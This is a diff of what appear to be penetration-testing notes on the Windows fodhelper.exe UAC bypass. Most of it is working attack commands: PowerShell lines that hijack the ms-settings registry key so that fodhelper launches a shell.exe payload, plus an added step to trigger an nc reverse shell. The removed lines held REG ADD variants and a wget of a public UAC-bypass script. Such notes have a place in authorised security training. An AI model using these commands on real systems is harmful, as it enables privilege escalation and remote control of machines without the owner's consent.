@@ -359,19 +359,15 @@ whoami /groups #check your integrity level/to get high integrity level to be abl
 C:\Windows\System32\fodhelper.exe #32 bit
 C:\Windows\SysNative\fodhelper.exe #64 bit
 ````
-````
-REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command
-REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ
-REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f
-````
-````
-wget https://raw.githubusercontent.com/CsEnox/EventViewer-UACBypass/main/Invoke-EventViewer.ps1 
-````
 Launch Powershell and run the following
 ````
 New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
 New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
 Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "cmd /c start C:\Users\ted\shell.exe" -Force
+````
+run fodhelper setup and nc shell and check your priority
+````
+C:\Windows\System32\fodhelper.exe
 ````
 
 
